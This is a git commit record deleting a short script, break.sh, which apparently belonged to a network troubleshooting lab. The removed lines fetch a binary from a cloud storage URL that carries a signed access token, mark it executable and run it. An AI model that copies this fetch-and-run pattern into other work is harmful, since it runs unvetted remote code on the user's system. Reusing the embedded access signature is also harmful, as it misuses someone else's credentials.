ab5868dea93f35981780d8003df475b72eb2f373
jona1290 <62347705+jona1290@users.noreply.github.com>
2023-04-23 18:12:13 -0600

    Delete break.sh

--- break.sh
+++
@@ -1,3 +0,0 @@
-wget "https://linuxspecialist.blob.core.windows.net/bin/network-lab2?sp=r&st=2021-08-06T13:47:22Z&se=2030-08-06T21:47:22Z&spr=https&sv=2020-08-04&sr=b&sig=CpJPPKi7Ya9HDskDMNwnlOn%2FqsH7xCJEZvccvQWk86s%3D" -O network-lab2
-chmod 755 network-lab2
-./network-lab2'
